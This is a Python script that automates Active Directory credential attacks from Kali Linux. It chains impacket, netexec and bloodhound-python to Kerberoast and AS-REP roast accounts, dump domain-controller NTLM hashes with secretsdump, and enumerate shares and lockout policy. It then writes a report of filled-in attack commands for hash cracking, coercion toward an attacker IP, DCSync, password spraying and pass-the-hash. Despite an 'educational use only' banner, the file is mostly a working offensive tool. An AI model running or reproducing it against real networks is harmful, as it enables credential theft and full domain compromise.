"""
kali_main.py - Remote AD enumeration from Kali using impacket + netexec + bloodhound-python.

Usage:
    python3 kali_main.py
"""

import os
import sys
import subprocess
import getpass
import re
import socket
import traceback
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from core.parser import Finding

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
class C:
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    GREEN   = "\033[92m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"
    DIM     = "\033[2m"
    MAGENTA = "\033[95m"

def _ok(m):   print(f"  {C.GREEN}[+]{C.RESET} {m}")
def _info(m): print(f"  {C.CYAN}[*]{C.RESET} {m}")
def _warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def _err(m):  print(f"  {C.RED}[-]{C.RESET} {m}")
def _section(t):
    print(f"\n{C.BOLD}{C.MAGENTA}{'─' * 60}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}  {t}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}{'─' * 60}{C.RESET}\n")

BANNER = r"""
  _  __     _ _   __  __       _
 | |/ /    | (_) |  \/  |     (_)
 | ' / __ _| |_  | \  / | __ _ _ _ __
 |  < / _` | | | | |\/| |/ _` | | '_ \
 | . \ (_| | | | | |  | | (_| | | | | |
 |_|\_\__,_|_|_| |_|  |_|\__,_|_|_| |_|

     Remote AD Recon from Kali - powered by impacket + netexec
     For educational use only.
"""

# ---------------------------------------------------------------------------
# Dependency check
# ---------------------------------------------------------------------------
REQUIRED_TOOLS = {
    "bloodhound-python":    "pip3 install bloodhound",
    "impacket-GetUserSPNs": "pip3 install impacket",
    "impacket-GetNPUsers":  "pip3 install impacket",
    "impacket-secretsdump": "pip3 install impacket",
    "ldapdomaindump":       "pip3 install ldapdomaindump",
    "netexec":              "sudo apt install netexec",
}

def check_deps():
    missing = []
    for tool, install in REQUIRED_TOOLS.items():
        r = subprocess.run(["which", tool], capture_output=True)
        if r.returncode != 0:
            missing.append((tool, install))
    if missing:
        _warn("Missing tools:")
        for tool, cmd in missing:
            print(f"    {C.RED}[x]{C.RESET} {tool:<30} {C.DIM}→ {cmd}{C.RESET}")
        print()
    return len(missing) == 0

# ---------------------------------------------------------------------------
# Wizard
# ---------------------------------------------------------------------------
def wizard():
    _section("Setup")

    dc_ip  = input(f"  {C.CYAN}>{C.RESET} DC IP: ").strip()
    domain = input(f"  {C.CYAN}>{C.RESET} Domain (e.g. corp.local): ").strip()
    user   = input(f"  {C.CYAN}>{C.RESET} Username: ").strip()

    print(f"\n  Auth type:")
    print(f"    {C.GREEN}[1]{C.RESET} Password  (default)")
    print(f"    {C.GREEN}[2]{C.RESET} NTLM hash")
    choice = input(f"  {C.CYAN}>{C.RESET} Choice [1]: ").strip() or "1"

    password = ""
    ntlm     = ""
    if choice == "2":
        ntlm = input(f"  {C.CYAN}>{C.RESET} NTLM hash (LM:NT or just NT): ").strip()
        if ":" not in ntlm:
            ntlm = f"aad3b435b51404eeaad3b435b51404ee:{ntlm}"
    else:
        password = getpass.getpass(f"  {C.CYAN}>{C.RESET} Password: ")

    out_dir = input(f"  {C.CYAN}>{C.RESET} Output directory [{C.DIM}./results{C.RESET}]: ").strip() or "./results"
    os.makedirs(out_dir, exist_ok=True)
    raw_dir     = os.path.join(out_dir, "raw")
    reports_dir = os.path.join(out_dir, "reports")
    os.makedirs(raw_dir, exist_ok=True)
    os.makedirs(reports_dir, exist_ok=True)

    # Resolve DC hostname for tools that need FQDN (e.g. bloodhound-python)
    dc_hostname = dc_ip
    try:
        resolved = socket.gethostbyaddr(dc_ip)[0]
        if "." in resolved:
            dc_hostname = resolved
            _ok(f"Resolved DC hostname: {dc_hostname}")
    except Exception:
        pass
    if dc_hostname == dc_ip:
        # Try guessing common DC name from domain
        dc_hostname = f"dc.{domain}"

    return {
        "dc_ip":       dc_ip,
        "dc_hostname": dc_hostname,
        "domain":      domain,
        "user":        user,
        "password":    password,
        "ntlm":        ntlm,
        "out_dir":     out_dir,
        "raw_dir":     raw_dir,
        "reports_dir": reports_dir,
    }

# ---------------------------------------------------------------------------
# Runner helpers
# ---------------------------------------------------------------------------
def _bin_exists(name):
    return subprocess.run(["which", name], capture_output=True).returncode == 0

def _run(cmd, out_file, timeout=300, cwd=None):
    binary = cmd[0]
    if not _bin_exists(binary):
        _warn(f"Skipping — '{binary}' not found. Install it and re-run.")
        return ""
    _info(f"Running: {' '.join(str(x) for x in cmd)}")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, errors="ignore", cwd=cwd
        )
        output = result.stdout + result.stderr
        if output.strip():
            with open(out_file, "w") as f:
                f.write(output)
            _ok(f"Done -> {out_file}")
        else:
            _warn(f"No output from {os.path.basename(out_file).replace('.txt','')}")
        return output
    except subprocess.TimeoutExpired:
        _warn(f"Timed out after {timeout}s")
        return ""
    except Exception as e:
        _err(f"Failed: {e}")
        return ""

def _nxc_auth(cfg, proto="smb"):
    base = ["netexec", proto, cfg["dc_ip"]]
    if cfg["ntlm"]:
        return base + ["-u", cfg["user"], "-H", cfg["ntlm"].split(":")[-1]]
    return base + ["-u", cfg["user"], "-p", cfg["password"]]

def _imp_auth(cfg):
    if cfg["ntlm"]:
        return [f"{cfg['domain']}/{cfg['user']}", "-hashes", cfg["ntlm"]]
    return [f"{cfg['domain']}/{cfg['user']}:{cfg['password']}"]

def _domain_to_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))

# ---------------------------------------------------------------------------
# Tool runners
# ---------------------------------------------------------------------------
def run_ldap_enum(cfg):
    raw_dir  = cfg["raw_dir"]
    dump_dir = os.path.join(raw_dir, "ldapdomaindump")
    os.makedirs(dump_dir, exist_ok=True)
    output   = ""

    # 1. ldapdomaindump
    _info("ldapdomaindump — full AD object dump...")

    # find the correct binary name
    ldd_bin = None
    for candidate in ["ldapdomaindump", "impacket-ldapdomaindump", "ldap-domaindump"]:
        if subprocess.run(["which", candidate], capture_output=True).returncode == 0:
            ldd_bin = candidate
            break

    if not ldd_bin:
        _warn("ldapdomaindump not found — install with: pip3 install ldapdomaindump")
    else:
        if cfg["ntlm"]:
            ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
        else:
            ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]

        r = subprocess.run(
            [ldd_bin] + ldd_auth + [cfg["dc_ip"], "-o", dump_dir, "--no-html"],
            capture_output=True, text=True, timeout=120, errors="ignore"
        )
        ldd_out = r.stdout + r.stderr
        output += f"=== LDAPDOMAINDUMP ===\n{ldd_out}\n"

    section_map = {
        "domain_users.grep":       "DOMAIN USERS",
        "domain_groups.grep":      "DOMAIN GROUPS",
        "domain_computers.grep":   "DOMAIN COMPUTERS",
        "domain_policy.grep":      "PASSWORD POLICY",
        "domain_trusts.grep":      "DOMAIN TRUSTS",
        "domain_controllers.grep": "DOMAIN CONTROLLERS",
    }
    for fname, sname in section_map.items():
        fpath = os.path.join(dump_dir, fname)
        if os.path.exists(fpath):
            content = open(fpath).read().strip()
            if content:
                output += f"\n=== {sname} ===\n{content}\n"
                _ok(f"Got {sname}")

    # 2. netexec ldap targeted queries
    _info("netexec ldap — targeted queries...")
    nxc_queries = {
        "KERBEROASTABLE USERS":     ["--kerberoasting", os.path.join(raw_dir, "kerberoast_hashes.txt")],
        "ASREP ROASTABLE USERS":    ["--asreproast",    os.path.join(raw_dir, "asrep_hashes.txt")],
        "UNCONSTRAINED DELEGATION": ["--trusted-for-delegation"],
        "ADMIN USERS":              ["--admin-count"],
        "DOMAIN USERS LIST":        ["--users"],
    }
    for sname, flags in nxc_queries.items():
        r = subprocess.run(
            _nxc_auth(cfg, "ldap") + flags,
            capture_output=True, text=True, timeout=30, errors="ignore"
        )
        content = (r.stdout + r.stderr).strip()
        if content:
            output += f"\n=== {sname} ===\n{content}\n"
            _ok(f"Got {sname}")

    out_file = os.path.join(raw_dir, "ldap_enum.txt")
    if output.strip():
        with open(out_file, "w") as f:
            f.write(output)
    return output


def run_kerberoast(cfg):
    out_file = os.path.join(cfg["raw_dir"], "kerberoast.txt")
    cmd = ["impacket-GetUserSPNs"] + _imp_auth(cfg) + [
        "-dc-ip", cfg["dc_ip"], "-request",
        "-outputfile", os.path.join(cfg["raw_dir"], "kerberoast_hashes.txt")
    ]
    return _run(cmd, out_file)


def run_asrep(cfg):
    out_file   = os.path.join(cfg["raw_dir"], "asrep.txt")
    users_file = os.path.join(cfg["raw_dir"], "users.txt")

    # Get user list from netexec
    r = subprocess.run(
        _nxc_auth(cfg, "ldap") + ["--users"],
        capture_output=True, text=True, timeout=30, errors="ignore"
    )
    users = re.findall(r"\s{2,}(\w[\w\.\-]+)\s{2,}", r.stdout)
    if users:
        with open(users_file, "w") as f:
            f.write("\n".join(set(users)))
        _ok(f"Got {len(set(users))} users for AS-REP check")

        cmd = ["impacket-GetNPUsers", f"{cfg['domain']}/",
               "-usersfile", users_file, "-dc-ip", cfg["dc_ip"],
               "-format", "hashcat",
               "-outputfile", os.path.join(cfg["raw_dir"], "asrep_hashes.txt")]
        return _run(cmd, out_file)
    else:
        _warn("Could not get user list for AS-REP — skipping")
        return ""


def run_bloodhound(cfg):
    _info("bloodhound-python — full collection (runs from raw_dir so ZIP lands there)...")
    log_file = os.path.join(cfg["raw_dir"], "bloodhound.log")

    cmd = [
        "bloodhound-python",
        "-d", cfg["domain"],
        "-u", cfg["user"],
        "-ns", cfg["dc_ip"],
        "-dc", cfg["dc_hostname"],
        "-c", "All",
        "--zip",
    ]
    if cfg["ntlm"]:
        cmd += ["--hashes", cfg["ntlm"]]
    else:
        cmd += ["-p", cfg["password"]]

    _info(f"Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=300, errors="ignore",
            cwd=cfg["raw_dir"]   # ZIP drops in cwd
        )
        output = result.stdout + result.stderr
        with open(log_file, "w") as f:
            f.write(output)

        zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
        if zips:
            _ok(f"BloodHound ZIP -> {os.path.join(cfg['raw_dir'], zips[0])}")
        else:
            _warn("No BloodHound ZIP generated. Last output:")
            for line in output.strip().splitlines()[-8:]:
                if line.strip():
                    print(f"    {C.DIM}{line}{C.RESET}")
        return output
    except Exception as e:
        _err(f"bloodhound-python failed: {e}")
        return ""


def run_shares(cfg):
    return _run(_nxc_auth(cfg) + ["--shares"],
                os.path.join(cfg["raw_dir"], "shares.txt"), timeout=60)


def run_passpol(cfg):
    return _run(_nxc_auth(cfg) + ["--pass-pol"],
                os.path.join(cfg["raw_dir"], "passpol.txt"), timeout=60)


def run_secretsdump(cfg):
    out_file = os.path.join(cfg["raw_dir"], "secretsdump.txt")
    cmd = ["impacket-secretsdump"] + _imp_auth(cfg) + [f"@{cfg['dc_ip']}", "-just-dc-ntlm"]
    return _run(cmd, out_file, timeout=120)

# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------
def parse_results(raw):
    findings = []
    ldap     = raw.get("ldap_enum", "")
    kerb     = raw.get("kerberoast", "")
    asrep    = raw.get("asrep", "")
    shares   = raw.get("shares", "")
    passpol  = raw.get("passpol", "")
    secrets  = raw.get("secretsdump", "")

    def get_section(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
        return m.group(1).strip() if m else ""

    # Kerberoastable — from impacket output AND netexec
    kerb_users = re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb)
    nxc_kerb   = re.findall(r"(\w[\w\.\-]+)\s.*?MemberOf", get_section(ldap, "KERBEROASTABLE USERS"))
    all_kerb   = list(dict.fromkeys(kerb_users + nxc_kerb))
    if all_kerb:
        findings.append(Finding("kerberoastable_users", f"Kerberoastable Accounts ({len(all_kerb)} found)",
            "HIGH", "Kerberos", "Accounts with SPNs — request TGS tickets and crack offline.", all_kerb, "impacket"))

    # AS-REP roastable
    asrep_users = re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep)
    if asrep_users:
        findings.append(Finding("asrep_roastable", f"AS-REP Roastable Accounts ({len(asrep_users)} found)",
            "HIGH", "Kerberos", "Pre-auth disabled — hash requestable without credentials.", asrep_users, "impacket"))

    # Unconstrained delegation
    unc = re.findall(r"(\S+)\s.*?TrustedForDelegation", get_section(ldap, "UNCONSTRAINED DELEGATION"), re.IGNORECASE)
    unc = [h for h in unc if "DC" not in h.upper()]
    if unc:
        findings.append(Finding("unconstrained_delegation", "Unconstrained Delegation (Non-DC)",
            "CRITICAL", "Delegation", "Coerce DC auth -> capture TGT -> DCSync.", unc, "netexec"))

    # No lockout
    if re.search(r"Lockout Threshold\s*:\s*0|lockoutThreshold.*0", passpol + ldap, re.IGNORECASE):
        findings.append(Finding("no_lockout", "No Account Lockout Policy",
            "HIGH", "PasswordPolicy", "No lockout — password spray freely.", ["Lockout Threshold: 0"], "netexec"))

    # NTLM hashes
    hashes = re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)
    if hashes:
        findings.append(Finding("hashes_found", f"NTLM Hashes Dumped ({len(hashes)} accounts)",
            "CRITICAL", "CredentialAccess", "Full hash dump — crack offline or pass-the-hash.", hashes[:20], "secretsdump"))

    # SMB shares
    interesting = re.findall(r"(SYSVOL|NETLOGON|[\w\-]+)\s+READ", shares, re.IGNORECASE)
    interesting = list(dict.fromkeys(interesting))
    if interesting:
        findings.append(Finding("smb_shares", f"Readable SMB Shares ({len(interesting)} found)",
            "MEDIUM", "Enumeration", "Check for sensitive files, scripts, and stored credentials.", interesting, "netexec"))

    findings.sort(key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity, 9))
    return findings

# ---------------------------------------------------------------------------
# Loot collector
# ---------------------------------------------------------------------------
def collect_loot(raw, cfg):
    ldap    = raw.get("ldap_enum", "")
    secrets = raw.get("secretsdump", "")
    kerb    = raw.get("kerberoast", "")
    asrep   = raw.get("asrep", "")

    def get_section(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL | re.IGNORECASE)
        return m.group(1).strip() if m else ""

    def grep_attr(text, attr):
        return list(dict.fromkeys(re.findall(rf"(?i){attr}[:\s]+(\S+)", text)))

    users_sec = get_section(ldap, "DOMAIN USERS LIST") or get_section(ldap, "DOMAIN USERS")
    admins_sec = get_section(ldap, "DOMAIN ADMINS") or get_section(ldap, "ADMIN USERS")

    return {
        "domain_users":       grep_attr(users_sec, "sAMAccountName") or
                              re.findall(r"\s{2,}(\w[\w\.\-]{2,})\s{2,}", users_sec),
        "domain_admins":      grep_attr(admins_sec, "sAMAccountName") or
                              re.findall(r"(\w[\w\.\-]+)\s.*?[Aa]dmin", admins_sec),
        "domain_computers":   grep_attr(get_section(ldap, "DOMAIN COMPUTERS"), "sAMAccountName"),
        "domain_controllers": grep_attr(get_section(ldap, "DOMAIN CONTROLLERS"), "sAMAccountName"),
        "kerberoastable":     re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb),
        "asrep_roastable":    re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep),
        "spns":               re.findall(r"ServicePrincipalName\s*:\s*(\S+)", kerb),
        "hashes_found":       re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)[:20],
        "passwords_found":    [],
        "password_policy":    re.findall(r"((?:Min|Max|Lock)\w+\s*[:\=]\s*\S+)", get_section(ldap, "PASSWORD POLICY") + raw.get("passpol","")),
        "domain_trusts":      grep_attr(get_section(ldap, "DOMAIN TRUSTS"), "trustPartner"),
        "gpos":               grep_attr(get_section(ldap, "GPO LIST"), "displayName"),
        "interesting_files":  [],
    }

# ---------------------------------------------------------------------------
# Report builder — plain text reports in results/reports/
# ---------------------------------------------------------------------------

SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

ATTACK_COMMANDS = {
    "kerberoastable_users": [
        "# Request TGS tickets",
        "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt",
        "# Crack offline",
        "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
    ],
    "asrep_roastable": [
        "# Request AS-REP hashes (no pre-auth needed)",
        "impacket-GetNPUsers {domain}/ -usersfile users.txt -dc-ip {dc_ip} -format hashcat -outputfile asrep_hashes.txt",
        "# Crack offline",
        "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
    ],
    "unconstrained_delegation": [
        "# Coerce DC auth with printerbug / PetitPotam",
        "python3 printerbug.py {domain}/{user}:{password}@{dc_ip} <ATTACKER_IP>",
        "# Capture TGT with Rubeus (on Windows box with unconstrained deleg)",
        "Rubeus.exe monitor /interval:5 /filteruser:DC$",
        "# DCSync after capturing ticket",
        "Rubeus.exe ptt /ticket:<BASE64_TGT>",
        "impacket-secretsdump {domain}/{user}@{dc_ip} -just-dc-ntlm",
    ],
    "no_lockout": [
        "# Password spray — no lockout risk",
        "netexec smb {dc_ip} -u users.txt -p <PASSWORD_CANDIDATE> --continue-on-success",
        "kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt <PASSWORD_CANDIDATE>",
    ],
    "hashes_found": [
        "# Pass-the-Hash",
        "netexec smb {dc_ip} -u <USER> -H <NT_HASH>",
        "impacket-psexec {domain}/<USER>@{dc_ip} -hashes :<NT_HASH>",
        "evil-winrm -i {dc_ip} -u <USER> -H <NT_HASH>",
    ],
    "smb_shares": [
        "# Mount and browse shares",
        "netexec smb {dc_ip} -u {user} -p {password} --shares",
        "smbclient //{dc_ip}/<SHARE> -U '{domain}\\{user}%{password}'",
    ],
}


def _divider(char="=", width=70):
    return char * width


def _fill_cmd(cmd, cfg):
    return (cmd
            .replace("{domain}",   cfg["domain"])
            .replace("{dc_ip}",    cfg["dc_ip"])
            .replace("{user}",     cfg["user"])
            .replace("{password}", cfg.get("password", "<PASSWORD>")))


def build_reports(findings, loot, raw, cfg):
    reports_dir = cfg["reports_dir"]
    ts          = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ── Report 1: Findings ────────────────────────────────────────────────
    lines1 = [
        _divider(),
        "  AD RECON — REPORT 1: FINDINGS & INTELLIGENCE",
        _divider(),
        f"  Generated : {ts}",
        f"  Domain    : {cfg['domain']}",
        f"  DC IP     : {cfg['dc_ip']}",
        f"  User      : {cfg['user']}",
        _divider(),
        "",
        "SUMMARY",
        _divider("-"),
    ]
    sev_counts = {}
    for f in findings:
        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in sev_counts:
            lines1.append(f"  [{sev}] {sev_counts[sev]} finding(s)")
    lines1 += [""]

    lines1 += ["INTELLIGENCE LOOT", _divider("-")]
    loot_fields = [
        ("Domain Users",       "domain_users"),
        ("Domain Admins",      "domain_admins"),
        ("Domain Computers",   "domain_computers"),
        ("Domain Controllers", "domain_controllers"),
        ("Kerberoastable",     "kerberoastable"),
        ("AS-REP Roastable",   "asrep_roastable"),
        ("SPNs",               "spns"),
        ("NTLM Hashes",        "hashes_found"),
        ("Passwords Found",    "passwords_found"),
        ("Password Policy",    "password_policy"),
        ("Domain Trusts",      "domain_trusts"),
        ("GPOs",               "gpos"),
        ("Interesting Files",  "interesting_files"),
    ]
    for label, key in loot_fields:
        items = loot.get(key, [])
        if items:
            lines1.append(f"\n  {label}:")
            for item in items:
                lines1.append(f"    - {item}")
    lines1 += [""]

    lines1 += ["FINDINGS", _divider("-")]
    for f in sorted(findings, key=lambda x: SEV_ORDER.get(x.severity, 9)):
        lines1 += [
            "",
            f"  [{f.severity}] {f.title}",
            f"  Category : {f.category}",
            f"  Tool     : {f.tool}",
            f"  Details  : {f.description}",
        ]
        if f.evidence:
            lines1.append("  Evidence :")
            for ev in (f.evidence if isinstance(f.evidence, list) else [f.evidence]):
                lines1.append(f"    {ev}")
        lines1.append(_divider("-", 50))

    r1_path = os.path.join(reports_dir, "report1_findings.txt")
    with open(r1_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines1))

    # ── Report 2: Attack Commands ─────────────────────────────────────────
    lines2 = [
        _divider(),
        "  AD RECON — REPORT 2: ATTACK COMMANDS",
        _divider(),
        f"  Generated : {ts}",
        f"  Domain    : {cfg['domain']}",
        f"  DC IP     : {cfg['dc_ip']}",
        f"  User      : {cfg['user']}",
        _divider(),
        "  Legend: [FILLED] = real value inserted  |  <PLACEHOLDER> = you fill this in",
        _divider(),
        "",
    ]

    # BloodHound guide
    raw_dir = cfg["raw_dir"]
    zips    = [f for f in os.listdir(raw_dir) if f.endswith(".zip")]
    lines2 += ["BLOODHOUND", _divider("-")]
    if zips:
        lines2 += [
            f"  ZIP file : {os.path.join(raw_dir, zips[0])}",
            "  Steps    :",
            "    1. Open BloodHound GUI",
            "    2. Click 'Upload Data' -> select the ZIP above",
            "    3. Run built-in queries: 'Shortest Paths to Domain Admins', 'Kerberoastable Users', etc.",
        ]
    else:
        lines2 += ["  No BloodHound ZIP found — check raw/bloodhound.log"]
    lines2.append("")

    lines2 += ["ATTACK PLAYBOOKS", _divider("-")]
    matched = [f for f in findings if f.id in ATTACK_COMMANDS]
    if not matched:
        lines2.append("  No attack templates matched the findings.")
    for f in matched:
        lines2 += [
            "",
            f"  [{f.severity}] {f.title}",
            _divider("-", 50),
        ]
        for cmd in ATTACK_COMMANDS[f.id]:
            lines2.append(f"    {_fill_cmd(cmd, cfg)}")
        lines2.append("")

    r2_path = os.path.join(reports_dir, "report2_attack_commands.txt")
    with open(r2_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines2))

    return r1_path, r2_path

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print(C.RED + BANNER + C.RESET)

    _section("Dependency Check")
    check_deps()

    cfg = wizard()

    _section("PHASE 2 - Remote Enumeration")

    raw = {}

    out = run_ldap_enum(cfg);    raw["ldap_enum"]    = out if out.strip() else ""
    out = run_kerberoast(cfg);   raw["kerberoast"]   = out if out.strip() else ""
    out = run_asrep(cfg);        raw["asrep"]        = out if out.strip() else ""
    out = run_shares(cfg);       raw["shares"]       = out if out.strip() else ""
    out = run_passpol(cfg);      raw["passpol"]      = out if out.strip() else ""
    out = run_bloodhound(cfg);   raw["bloodhound"]   = out if out.strip() else ""

    _warn("Attempting secretsdump (needs admin — fails silently if not)...")
    out = run_secretsdump(cfg);  raw["secretsdump"]  = out if out.strip() else ""

    # Remove empty keys
    raw = {k: v for k, v in raw.items() if v}

    _section("PHASE 3 - Report Generation")

    findings = parse_results(raw)
    _ok(f"Parsed {len(findings)} finding(s).")

    loot = collect_loot(raw, cfg)

    try:
        r1, r2 = build_reports(findings, loot, raw, cfg)
        _section("Done")
        _ok(f"Report 1 (Findings):        {r1}")
        _ok(f"Report 2 (Attack Commands): {r2}")
        _ok(f"Raw output:                 {cfg['raw_dir']}")

        zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
        if zips:
            _ok(f"BloodHound ZIP:             {os.path.join(cfg['raw_dir'], zips[0])}")
        else:
            _warn("No BloodHound ZIP — check raw/bloodhound.log")
        print()
    except Exception:
        _err("Report generation failed:")
        traceback.print_exc()


if __name__ == "__main__":
    main()
